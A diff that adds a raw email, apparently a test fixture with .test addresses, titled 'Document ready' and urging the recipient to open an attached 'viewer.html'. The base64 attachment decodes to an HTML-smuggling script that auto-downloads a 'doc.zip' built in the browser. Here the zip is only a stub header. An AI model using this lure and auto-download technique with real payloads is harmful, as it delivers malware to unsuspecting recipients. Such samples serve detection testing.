@@ -1,0 +1,26 @@
+From: "Docs" <docs@doc-viewer.test>
+To: rob@rcpt.test
+Subject: Document ready
+Date: Tue, 03 Nov 2026 09:15:00 +0000
+Message-ID: <m2b-027@mail.sender-27.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============6113167543853689589=="
+
+--===============6113167543853689589==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Open the document.
+
+--===============6113167543853689589==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="viewer.html"
+MIME-Version: 1.0
+
+PGh0bWw+PHNjcmlwdD52YXIgYmxvYj1uZXcgQmxvYihbYXRvYigiVUVzREJBPT0iKV0pO3ZhciBs
+PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImEiKTtsLmhyZWY9VVJMLmNyZWF0ZU9iamVjdFVSTChi
+bG9iKTtsLnNldEF0dHJpYnV0ZSgiZG93bmxvYWQiLCJkb2MuemlwIik7bC5jbGljaygpOzwvc2Ny
+aXB0PjwvaHRtbD4=
+
+--===============6113167543853689589==--
